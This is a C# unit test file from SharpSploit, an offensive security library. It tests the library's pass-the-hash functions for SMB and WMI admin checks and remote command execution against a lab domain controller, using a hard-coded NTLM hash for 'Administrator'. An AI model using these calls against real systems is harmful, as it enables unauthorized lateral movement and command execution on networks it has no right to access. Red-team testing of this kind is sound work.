// Author: Ryan Cobb (@cobbr_io)
// Project: SharpSploit (https://github.com/cobbr/SharpSploit)
// License: BSD 3-Clause

using Microsoft.VisualStudio.TestTools.UnitTesting;

using SharpSploit.LateralMovement;

namespace SharpSploit.Tests.LateralMovement
{
    [TestClass]
    public class PassTheHashTests
    {
        [TestMethod]
        public void TestSMBAdminCheck()
        {
            var result = PassTheHash.SMBAdminCheck("Administrator", "FC525C9683E8FE067095BA2DDC971889", "DEV", "dc");
            Assert.IsTrue(result);
        }

        [TestMethod]
        public void TestWMIAdminCheck()
        {
            var result = PassTheHash.WMIAdminCheck("Administrator", "FC525C9683E8FE067095BA2DDC971889", "DEV", "dc");
            Assert.IsTrue(result);
        }

        [TestMethod]
        public void TestSMBExec()
        {
            var result = PassTheHash.SMBExecute("Administrator", "FC525C9683E8FE067095BA2DDC971889", "DEV", "dc", "hostname");
            Assert.IsTrue(!string.IsNullOrEmpty(result));
        }

        [TestMethod]
        public void TestWMIExec()
        {
            var result = PassTheHash.WMIExecute("Administrator", "FC525C9683E8FE067095BA2DDC971889", "DEV", "dc", "hostname");
            Assert.IsTrue(result.Contains("Command executed with process ID"));
        }
    }
}